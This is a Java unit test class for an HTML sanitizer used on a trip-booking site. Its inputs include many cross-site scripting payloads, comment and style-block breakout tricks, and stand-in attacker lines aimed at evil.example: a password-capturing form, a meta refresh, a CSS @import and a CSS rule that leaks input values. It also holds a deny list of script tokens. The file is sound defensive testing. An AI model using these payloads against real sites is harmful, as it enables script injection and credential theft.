package org.paulsens.trip.content;

import java.util.List;
import org.testng.Assert;
import org.testng.annotations.DataProvider;
import org.testng.annotations.Test;

/**
 * Hand-authored page HTML through the allowlist ({@link PageHtml}, medjugorje#158). Two promises, and a test
 * class half for each: nothing typed can run script or reach outside its own markup, and everything the
 * 2026-11-17 production scan found in trip descriptions, rich-text values and titles comes out with nothing lost.
 */
public class PageHtmlTest {

    /**
     * Nothing live outside a comment or a style block; what a kept comment holds is its author's text and what a
     * kept block holds is CSS, and neither is markup. A block is read as a browser reads it: to the first
     * {@code </style}.
     */
    private static void assertInert(final String cleaned) {
        final String lower = cleaned.replaceAll("(?s)<!--.*?-->", "")
                .replaceAll("(?is)<style(?: media=\"[^\"<>]*\")?>.*?</style>", "").toLowerCase(java.util.Locale.ROOT);
        for (final String never : List.of("<script", "onerror", "onload", "onclick", "onmouseover", "javascript:",
                "srcdoc", "<form", "<input", "<base", "<meta", "<link", "<style", "<object", "<embed", "data:text")) {
            Assert.assertFalse(lower.contains(never), "\"" + never + "\" survived in: " + cleaned);
        }
    }

    @DataProvider
    public Object[][] attacks() {
        return new Object[][] {
            {"<script>alert(1)</script>"},
            {"<img src=x onerror=alert(1)>"},
            {"<img src=\"x\"onerror=alert(1)>"},
            {"<svg/onload=alert(1)>"},
            {"<svg><script>alert(1)</script></svg>"},
            {"<svg><image href=\"x\" onerror=\"alert(1)\"></image></svg>"},
            {"<math><mtext><img src=x onerror=alert(1)></mtext></math>"},
            {"<a href=\"jav&#97;script:alert(1)\">x</a>"},
            {"<a href=\"JaVaScRiPt:alert(1)\">x</a>"},
            {"<a href=\" javascript:alert(1)\">x</a>"},
            {"<a href=\"data:text/html,<script>alert(1)</script>\">x</a>"},
            {"<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"},
            {"<iframe src=\"javascript:alert(1)\"></iframe>"},
            {"<form action=\"https://evil.example\"><input name=\"password\"><button>Go</button></form>"},
            {"<base href=\"https://evil.example/\">"},
            {"<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">"},
            {"<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">"},
            {"<style>@import url(https://evil.example/x.css);</style>"},
            {"<object data=\"x.swf\"></object><embed src=\"x.swf\">"},
            {"<div onmouseover=\"alert(1)\" style=\"color:red\">x</div>"},
            {"<p title=\"x\" onclick=\"alert(1)\">x</p>"},
            {"<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>"},
            {"<textarea></textarea><img src=x onerror=alert(1)>"},
            {"<title><img src=x onerror=alert(1)></title>"},
            {"<template><img src=x onerror=alert(1)></template>"},
            {"<a href=\"https://x.example\" onclick=\"alert(1)\" target=\"_blank\">x</a>"},
            {"<div style=\"x:y\" onerror=\"alert(1)\" " + PageHtml.CHECKED_STYLE + "=\"position:fixed\">x</div>"},
            {"<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">"},
            {"<![CDATA[<script>alert(1)</script>]]>"},
            {"<p>ok</p><!--[if IE]><script>alert(1)</script><![endif]-->"},
        };
    }

    @Test(dataProvider = "attacks")
    public void nothingTypedCanRunScript(final String typed) {
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting(typed);
        assertInert(cleaned.body());
        Assert.assertEquals(PageHtml.clean(cleaned.body()), cleaned.body(), "a clean body cleans to itself");
    }

    /** A value that ends up inside a tag may not close its attribute and start another. */
    @Test
    public void anAttributeValueCannotLeaveItsAttribute() {
        final String cleaned = PageHtml.clean("<p title='\" onmouseover=\"alert(1)'>x</p>"
                + "<div style='color:red\" onmouseover=\"alert(1)'>y</div>");
        Assert.assertFalse(cleaned.contains("\" onmouseover=\""), cleaned);
    }

    /** A browser reads all three as another site; the library alone keeps the first two. */
    @Test
    public void anAddressThatHidesAnotherHostIsDropped() {
        Assert.assertEquals(PageHtml.clean("<a href=\"//evil.example/x\">a</a>"), "<a>a</a>");
        Assert.assertEquals(PageHtml.clean("<a href=\"/\\evil.example/x\">a</a>"), "<a>a</a>");
        Assert.assertEquals(PageHtml.clean("<a href=\"https:\\\\evil.example\">a</a>"), "<a>a</a>");
        Assert.assertEquals(PageHtml.clean("<img src=\"//evil.example/x.png\" alt=\"a\">"), "<img alt=\"a\" />");
        Assert.assertEquals(PageHtml.clean("<iframe src=\"http://plain.example/\"></iframe>"), "<iframe></iframe>");
        Assert.assertEquals(PageHtml.clean("<iframe src=\"/trip/edit.jsf\"></iframe>"), "<iframe></iframe>");
    }

    /** A frame may not ask for the camera, the microphone or a payment in this site's name. */
    @Test
    public void aFrameGetsOnlyHarmlessFeatures() {
        final String video = "<iframe src=\"https://www.youtube.com/embed/abc\" "
                + "allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; "
                + "picture-in-picture; web-share\" allowfullscreen=\"true\"></iframe>";
        final PageHtml.Cleaned kept = PageHtml.cleanNoting(video);
        Assert.assertFalse(kept.dropped(), kept.summary(5));
        Assert.assertTrue(kept.body().contains("picture-in-picture; web-share"), kept.body());
        final PageHtml.Cleaned asking = PageHtml.cleanNoting(
                "<iframe src=\"https://evil.example/\" allow=\"camera; microphone\"></iframe>");
        Assert.assertFalse(asking.body().contains("camera"), asking.body());
        Assert.assertEquals(asking.drops(), List.of(new PageHtml.Drop(PageHtml.Drop.ATTRIBUTE, "iframe", "allow")));
    }

    /** An id may not be one the page looks up for itself, or shaped like a Faces client id. */
    @Test
    public void anIdCannotTakeThePagesOwn() {
        Assert.assertEquals(PageHtml.clean("<h2 id=\"schedule\">S</h2>"), "<h2 id=\"schedule\">S</h2>");
        Assert.assertEquals(PageHtml.clean("<div id=\"form\">x</div>"), "<div>x</div>");
        Assert.assertEquals(PageHtml.clean("<div id=\"form:save\">x</div>"), "<div>x</div>");
        Assert.assertEquals(PageHtml.clean("<a name=\"TOC-Board-of-Directors\">x</a>"),
                "<a name=\"TOC-Board-of-Directors\">x</a>");
        Assert.assertEquals(PageHtml.clean("<div data-pfconfirmcommand=\"alert(1)\">x</div>"), "<div>x</div>");
    }

    /** The save tells the writer what it removed, each thing once, in words they typed. */
    @Test
    public void whatIsRemovedIsNamed() {
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting("<p onclick=\"a()\" style=\"color:red\" data-ph=\"x\">"
                + "Hi<script>x()</script><script>y()</script></p>");
        Assert.assertEquals(cleaned.body(), "<p style=\"color:red\">Hi</p>");
        Assert.assertTrue(cleaned.dropped());
        Assert.assertEquals(cleaned.summary(5), "onclick on <p>, data-ph on <p>, <script>");
        Assert.assertEquals(cleaned.summary(1), "onclick on <p> and 2 more");
    }

    /**
     * The owner's decision, 2026-11-21: an inline style allows whatever a style block allows, which for an
     * attribute is everything. Nothing in it can leave the attribute, whatever it holds.
     */
    @Test
    public void anInlineStyleIsKeptAsTyped() {
        final String stored = "<div style=\"position: fixed ; z-index:9;margin:-10px auto 0 -5px;"
                + "background:url(https://x.example/a.png);--c:var(--wp--preset--color--x);animation:spin 2s\">x</div>";
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting(stored);
        Assert.assertEquals(cleaned.body(), stored);
        Assert.assertFalse(cleaned.dropped());
        final String breakout = PageHtml.clean("<p style='color:red\"><script>alert(1)</script><p x=\"'>a</p>");
        assertInert(breakout.replaceAll("style=\"[^\"]*\"", ""));
        Assert.assertEquals(PageHtml.clean("<p style=\"  \">a</p>"), "<p>a</p>", "a blank style is not written");
    }

    /** An author who reopens the source finds a mail link, a query string and a phone number as typed. */
    @Test
    public void addressesComeBackSpelledAsTyped() {
        final String stored = "<p>Write to <a href=\"mailto:office@example.org?subject=Trip+2027\">office@example."
                + "org</a> or call <a href=\"tel:+15035551212\">+1 503 555 1212</a>; 2 + 2 = 4.</p>";
        Assert.assertEquals(PageHtml.clean(stored), stored);
        Assert.assertEquals(PageHtml.clean("<p>&amp;#64; is how an at sign is spelled</p>"),
                "<p>&amp;#64; is how an at sign is spelled</p>", "an entity written ABOUT stays written about");
    }

    /**
     * The owner's decision, 2026-11-21: any data- attribute is the author's, except a name a script on the
     * site's pages acts on. The kept ones come back under their own names with their own values.
     */
    @Test
    public void aDataAttributeIsKeptUnlessAPageScriptOwnsItsName() {
        final String stored = "<div class=\"c\" data-src=\"a b&amp;c=d%20e\" data-my-thing=\"{&#34;k&#34;:[1,2]}\" "
                + "data-empty=\"\" data-id=\"7\">x</div>";
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting(stored);
        Assert.assertFalse(cleaned.dropped(), cleaned.summary(5));
        Assert.assertEquals(HtmlShape.of(cleaned.body()), HtmlShape.of(stored));
        Assert.assertEquals(PageHtml.clean(cleaned.body()), cleaned.body(), "cleaning twice changes nothing");
        Assert.assertTrue(cleaned.body().contains("data-src=\"a b&amp;c=d%20e\""), cleaned.body());

        for (final String owned : List.of("data-pfconfirmcommand", "data-p-label", "data-item-id", "data-ph",
                "data-return-url", "data-trip-anything", "data-tooltip-delay", PageHtml.CHECKED_DATA, "data-BAD!")) {
            final PageHtml.Cleaned refused = PageHtml.cleanNoting("<div " + owned + "=\"alert(1)\">x</div>");
            Assert.assertEquals(refused.body(), "<div>x</div>", owned);
        }
        Assert.assertEquals(
                PageHtml.clean("<div data-a=\"1\" DATA-A=\"2\" data-b=\"x&quot; onclick=&quot;y()\">x</div>"),
                "<div data-a=\"1\" data-b=\"x&#34; onclick=&#34;y()\">x</div>",
                "the first of a repeated name, and a value cannot leave its attribute");
    }

    /** Parked text stays where its author left it, word for word, whatever it holds. */
    @Test
    public void aCommentIsKeptAsTyped() {
        final String stored = "<!-- <center><span style=\"color:#FF3333\">NOTE: This trip is full.</span></center> -->"
                + "<h2>June</h2><p>We will explore <!--\nwith Fr. John. <b>Fr. John</b>, the pastor -- of two\n-->"
                + "during the Anniversary.</p><!-- <script>old()</script> -->";
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting(stored);
        Assert.assertEquals(cleaned.body(), stored);
        Assert.assertFalse(cleaned.dropped());
        Assert.assertEquals(HtmlShape.of(cleaned.body()), HtmlShape.of(stored));
        Assert.assertEquals(HtmlShape.of(stored).comments().size(), 3);
        Assert.assertFalse(HtmlShape.of(cleaned.body()).tags().contains("script"), "a comment's words are not tags");
    }

    /**
     * Between a list's items or a table's rows the sanitizer keeps no text, so a comment there moves into the
     * next text that follows, or to the end: its words are kept and the list gains no item.
     */
    @Test
    public void aCommentBetweenItemsOrRowsMovesToTheNextText() {
        Assert.assertEquals(PageHtml.clean("<ul><!-- old --><li>One</li> <!-- two --> <li>Two</li><!-- end --></ul>"),
                "<ul><li><!-- old -->One</li><li><!-- two -->Two</li></ul><!-- end -->");
        final PageHtml.Cleaned table = PageHtml.cleanNoting(
                "<table><!-- a --><tr><!-- b --><td>x</td></tr><!-- c --></table><p>after</p>");
        Assert.assertEquals(table.body(),
                "<table><tbody><tr><td><!-- a --><!-- b -->x</td></tr></tbody></table><p><!-- c -->after</p>");
        Assert.assertFalse(table.dropped());
        Assert.assertEquals(PageHtml.clean(table.body()), table.body());
    }

    @DataProvider
    public Object[][] commentTricks() {
        return new Object[][] {
            // A browser ends these two comments at once, and reads what follows as markup.
            {"<!--><script>alert(1)</script>-->"},
            {"<!---><img src=x onerror=alert(1)>-->"},
            // The other way a comment ends.
            {"<!-- x --!><img src=x onerror=alert(1)> -->"},
            // Markup to the old Internet Explorer.
            {"<!--[if IE]><script>alert(1)</script><![endif]-->"},
            // A "comment" that starts inside an attribute, or sits whole in one, never comes back out of it.
            {"<a title=\"<!--\" href=\"/x\">x</a><img src=x onerror=alert(1)><!-- \" -->"},
            {"<p title='<!-- \"><img src=x onerror=alert(1)> -->'>y</p>"},
            // A frame's content is read raw: a comment there would end the frame.
            {"<iframe src=\"https://x.example/\"><!-- </iframe><script>alert(1)</script> --></iframe>"},
            {"<!-- never closed <img src=x onerror=alert(1)>"},
        };
    }

    /** A comment is kept only where, and only when, a browser will read it as a comment and nothing else. */
    @Test(dataProvider = "commentTricks")
    public void aCommentCannotBecomeMarkup(final String typed) {
        final String cleaned = PageHtml.clean(typed);
        final String outsideComments = cleaned.replaceAll("(?s)<!--(?!>|->)(?:(?!--!>).)*?-->", "");
        Assert.assertFalse(outsideComments.contains("<script") || outsideComments.contains("onerror")
                || outsideComments.contains("<!--"), cleaned);
        Assert.assertFalse(cleaned.contains("<!-->") || cleaned.contains("<!--->") || cleaned.contains("--!>"),
                cleaned);
        Assert.assertFalse(cleaned.contains("tripc"), "no marker is left behind: " + cleaned);
        Assert.assertEquals(PageHtml.clean(cleaned), cleaned);
    }

    @Test
    public void aRefusedCommentIsReported() {
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting("<p title=\"<!-- hidden away -->\">y</p>"
                + "<!--[if IE]>old<![endif]-->");
        Assert.assertEquals(cleaned.body(), "<p title=\"\">y</p>");
        Assert.assertEquals(cleaned.summary(5), "the comment \"[if IE]>old<![endif]\", the comment \"hidden away\"");
    }

    /** The owner's decision, 2026-11-21: a style block is the author's, and may restyle the page around it. */
    @Test
    public void aStyleBlockIsKeptAsTyped() {
        final String stored = "<style>\n.fit-width{max-width:100%;height:auto;display:block}\n"
                + "@media (max-width: 600px) { body > header a[href^=\"/\"]:hover { color: red !important } }\n"
                + "@font-face{font-family:X;src:url(https://fonts.example/x.woff2)}\n"
                + "<!-- .old{position:fixed;z-index:9} -->\n</style><p class=\"fit-width\">Hi</p>";
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting(stored);
        Assert.assertEquals(cleaned.body(), stored);
        Assert.assertFalse(cleaned.dropped(), cleaned.summary(5));
        Assert.assertEquals(PageHtml.clean(cleaned.body()), cleaned.body(), "cleaning twice changes nothing");
    }

    /** A print stylesheet stays one; the tag's other attributes are spelling. */
    @Test
    public void aStyleBlockKeepsItsMediaAndNothingElse() {
        Assert.assertEquals(
                PageHtml.clean("<STYLE type=\"text/css\" media='print' onload=\"x()\">p{color:red}</STYLE >"),
                "<style media=\"print\">p{color:red}</style>");
        // The tag ends where a browser ends it, so what follows is CSS, however little sense it makes.
        Assert.assertEquals(PageHtml.clean("<style media=\"x\"><y\">p{}</style>"),
                "<style media=\"x\"><y\">p{}</style>");
        Assert.assertEquals(PageHtml.clean("<style media=\"x<y\">p{}</style>"), "<style>p{}</style>");
    }

    @Test
    public void aStyleBlockLosesOnlyTheTwoRefusedRules() {
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting("<style>@import url(https://evil.example/x.css);"
                + ".a{color:red}input[value^=\"a\"]{background:url(https://evil.example/a)}.b{margin:0}</style>");
        Assert.assertEquals(cleaned.body(), "<style>.a{color:red}.b{margin:0}</style>");
        Assert.assertEquals(cleaned.summary(5),
                "the rule \"@import url(https://evil.example/x.css);\" in a <style> block, "
                + "the rule \"input[value^=\"a\"]\" in a <style> block");
        Assert.assertEquals(PageHtml.clean("<p>a</p><style>@import 'x.css';</style>"), "<p>a</p>",
                "a block with nothing left is not written");
    }

    @DataProvider
    public Object[][] styleTricks() {
        return new Object[][] {
            {"<style>p{}</style><script>alert(1)</script>"},
            {"<style>p{}</STYLE x><img src=x onerror=alert(1)>"},
            {"<style>p{} <script>alert(1)</script>"},
            {"<style><!-- </style><img src=x onerror=alert(1)> --></style>"},
            {"<style><style>p{}</style><img src=x onerror=alert(1)></style>"},
            {"<div title=\"<style>p{}</style>\" onclick=\"alert(1)\">x</div>"},
            {"<div title=\"<style>\" onclick=\"alert(1)\" x=\"</style>\">x</div>"},
            {"<iframe src=\"https://x.example\"><style>p{}</style><script>alert(1)</script></iframe>"},
            {"<!-- <style>p{} --><img src=x onerror=alert(1)></style>"},
            {"<style>p{}</style\n<img src=x onerror=alert(1)>"},
            {"<textarea><style>p{}</style></textarea><img src=x onerror=alert(1)>"},
            {"<svg><style>p{}</style><script>alert(1)</script></svg>"},
            {"<style onload=\"alert(1)\" media=\"print\" onerror=alert(1)>p{}</style>"},
        };
    }

    /** A block goes back only where, and only as, a browser will read it as CSS and nothing else. */
    @Test(dataProvider = "styleTricks")
    public void aStyleBlockCannotBecomeMarkup(final String typed) {
        final String cleaned = PageHtml.clean(typed);
        assertInert(cleaned);
        Assert.assertFalse(cleaned.matches("(?s).*tripc[0-9a-f]{32}x.*"), "a marker was left behind: " + cleaned);
        Assert.assertEquals(PageHtml.clean(cleaned), cleaned, "cleaning twice changes nothing");
    }

    /** Between a table's rows the sanitizer keeps no text, so a block there moves on, as a comment does. */
    @Test
    public void aStyleBlockBetweenRowsMovesToTheNextText() {
        final String cleaned = PageHtml.clean("<table><style>td{color:red}</style><tr><td>a</td></tr></table>");
        Assert.assertEquals(cleaned, "<table><tbody><tr><td><style>td{color:red}</style>a</td></tr></tbody></table>");
    }

    @Test
    public void blankStaysBlankAndNullStaysNullOnlyWhereAsked() {
        Assert.assertEquals(PageHtml.clean(null), "");
        Assert.assertEquals(PageHtml.clean(""), "");
        Assert.assertNull(PageHtml.cleanOrNull(null));
        Assert.assertEquals(PageHtml.cleanOrNull("<b>x</b>"), "<b>x</b>");
        Assert.assertFalse(PageHtml.cleanNoting("plain text & more").dropped());
    }

    /** A template body is not this class's to clean: its tokens come out unreadable, on purpose. */
    @Test
    public void aTemplateTokenDoesNotSurvive() {
        Assert.assertFalse(PageHtml.clean("<p>{{name}}</p><a href=\"{{url}}\">x</a>").contains("{{"));
    }

    /** A hostile body costs time in proportion to its size, not to its square. */
    @Test(timeOut = 20_000)
    public void aHugeHostileBodyIsCleanedInBoundedTime() {
        final String unclosed = "<div style=\"color:red\" onclick=\"x()\"<".repeat(10_000);
        final String nested = "<div>".repeat(20_000) + "x";
        final String quotes = "<a href=\"" + "\"'".repeat(100_000);
        final String comments = "<!--".repeat(100_000) + "<!-- a --> <!-- b -->".repeat(20_000);
        for (final String hostile : List.of(unclosed, nested, quotes, comments)) {
            assertInert(PageHtml.clean(hostile));
        }
    }

    @DataProvider
    public Object[][] inUse() {
        return new Object[][] {
            // Layout blocks as pasted from another site's page builder.
            {"<div class=\"wp-block-columns\" id=\"prices\" style=\"display:flex;flex-wrap:wrap;gap:2em\">"
                + "<div style=\"flex-basis:50%;position:relative;padding-top:var(--wp--preset--spacing--40)\">"
                + "<h2 class=\"has-text-align-center\" style=\"font-size:2rem;text-align:center\">Prices</h2>"
                + "</div></div>"},
            {"<section id=\"faq\" class=\"band\"><article itemscope itemtype=\"https://schema.org/Event\">"
                + "<header class=\"entry\"><h1 itemprop=\"name\">Title</h1></header>"
                + "<main id=\"content\"><aside role=\"note\" aria-label=\"Tip\">Bring water</aside></main>"
                + "</article></section>"},
            // A table of costs, a figure with its caption, a pasted carousel's settings.
            {"<table style=\"width:100%;border-collapse:collapse\"><tbody><tr><td colspan=\"2\">Land</td>"
                + "<td style=\"text-align:right\">$2,100</td></tr></tbody></table>"},
            {"<figure class=\"wp-block-image\" style=\"margin:0 auto\"><img src=\"https://files.example.org/a.jpg\" "
                + "alt=\"The church\" width=\"600\" height=\"400\" loading=\"lazy\" decoding=\"async\" "
                + "class=\"wp-image-12\" style=\"border-radius:8px;object-fit:cover\">"
                + "<figcaption>Evening Mass</figcaption></figure>"},
            {"<div data-per-view=\"3\" data-gap=\"16\" data-autoplay=\"4000\" data-glide-el=\"track\" tabindex=\"0\">"
                + "<div data-section=\"a\" aria-hidden=\"true\">x</div></div>"},
            // Images from this site, a video, an inline icon.
            {"<img src=\"/medjugorje/trips/2023StPatrick/Apparition1.jpg\" style=\"float:right;width:40%\">"},
            {"<iframe class=\"ql-video\" frameborder=\"0\" allowfullscreen=\"true\" "
                + "src=\"https://www.youtube.com/embed/abc123\" width=\"560\" height=\"315\" "
                + "referrerpolicy=\"strict-origin-when-cross-origin\" style=\"aspect-ratio:16/9\"></iframe>"},
            {"<svg xmlns=\"http://www.w3.org/2000/svg\" style=\"width:18px;\" viewBox=\"0 0 448 512\">"
                + "<path d=\"M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9z\"></path></svg>"},
            // Links: another site in a new tab, mail, a phone, this site's own pages, an in-page anchor.
            {"<a href=\"https://maps.app.goo.gl/x1\" target=\"_blank\" rel=\"noopener noreferrer\" "
                + "style=\"color: rgb(0, 102, 204);\">Map</a> <a href=\"mailto:office@example.org\">Write</a> "
                + "<a href=\"tel:+15035551212\">Call</a> <a href=\"/trip/tripDetails.jsf?trip=1&amp;tab=2\">Trip</a> "
                + "<a href=\"faqs/cheap-tickets.jsf\">FAQ</a> <a href=\"#prices\" class=\"btn\" title=\"Prices\">"
                + "Prices</a> <a href=\"http://www.medjugorje.hr/files/file/mladifest2019eng.pdf\">PDF</a>"},
            // What the editor (Quill 2) writes.
            {"<ol><li data-list=\"bullet\"><span class=\"ql-ui\" contenteditable=\"false\"></span>One</li>"
                + "<li data-list=\"ordered\" class=\"ql-indent-1\">Two</li></ol><p class=\"ql-align-center\"><strong>"
                + "Bold</strong> <em>it</em> <u>u</u> <s>s</s> <sup>th</sup><br></p><blockquote>Quote</blockquote>"
                + "<h3>Head</h3><hr><p><span style=\"color: rgb(230, 0, 0); background-color: rgb(255, 255, 0);\">"
                + "Red</span></p>"},
            // Old hand-written pages.
            {"<center><b>Notice</b></center><p align=\"center\"><i>Soon</i><br clear=\"all\"></p>"
                + "<dl><dt>When</dt><dd>May</dd></dl><h4 class=\"x\">Four</h4><h5 style=\"margin:0\">Five</h5>"},
            {"<h2>Medjugorje Events</h2>"},
            {"A &amp; B&nbsp;C &lt;tag&gt; café …"},
        };
    }

    /** Everything production holds goes through with nothing removed, and a second clean changes nothing. */
    @Test(dataProvider = "inUse")
    public void whatProductionHoldsLosesNothing(final String stored) {
        final PageHtml.Cleaned cleaned = PageHtml.cleanNoting(stored);
        Assert.assertFalse(cleaned.dropped(), "dropped " + cleaned.summary(10) + " from " + stored);
        Assert.assertEquals(PageHtml.clean(cleaned.body()), cleaned.body());
        Assert.assertEquals(HtmlShape.of(cleaned.body()), HtmlShape.of(stored));
    }

    /** The exact text, for the pieces a person reads in Source mode or a test elsewhere compares. */
    @Test
    public void commonMarkupComesBackAsItWent() {
        for (final String same : List.of("<h2>Medjugorje Events</h2>", "<p><strong>Bold</strong> text</p>",
                "<p style=\"text-align:center\">Centered</p>", "<p>A &amp; B&nbsp;C</p>",
                "<ul><li>One</li><li>Two</li></ul>", "<a href=\"/trip/x.jsf\">Trip</a>",
                "<div class=\"a b\" id=\"x\">y</div>")) {
            Assert.assertEquals(PageHtml.clean(same), same);
        }
        Assert.assertEquals(PageHtml.clean("<a href=\"https://x.example\" target=\"_blank\">a</a>"),
                "<a href=\"https://x.example\" target=\"_blank\" rel=\"noopener\">a</a>",
                "a new tab cannot reach back into this page, and the other site still sees where it came from");
    }

    /** The author's own rel is theirs: kept as typed, with only the word a new tab needs added. */
    @Test
    public void aLinksRelIsKeptAndANewTabGetsNoOpener() {
        Assert.assertEquals(PageHtml.clean("<a href=\"https://x.example\" rel=\"noopener noreferrer\" "
                + "target=\"_blank\">a</a>"),
                "<a href=\"https://x.example\" rel=\"noopener noreferrer\" target=\"_blank\">a</a>");
        Assert.assertEquals(PageHtml.clean("<a href=\"https://x.example\" rel=\"nofollow\" target=\"_blank\">a</a>"),
                "<a href=\"https://x.example\" rel=\"nofollow noopener\" target=\"_blank\">a</a>");
        Assert.assertEquals(PageHtml.clean("<a href=\"https://x.example\" rel=\"nofollow\">a</a>"),
                "<a href=\"https://x.example\" rel=\"nofollow\">a</a>", "the same tab needs nothing added");
        final PageHtml.Cleaned odd = PageHtml.cleanNoting("<a href=\"/x\" rel=\"a&lt;b\" "
                + PageHtml.CHECKED_REL + "=\"opener\">a</a>");
        Assert.assertEquals(odd.body(), "<a href=\"/x\">a</a>");
        Assert.assertEquals(odd.drops(), List.of(new PageHtml.Drop(PageHtml.Drop.ATTRIBUTE, "a", "rel")));
    }
}
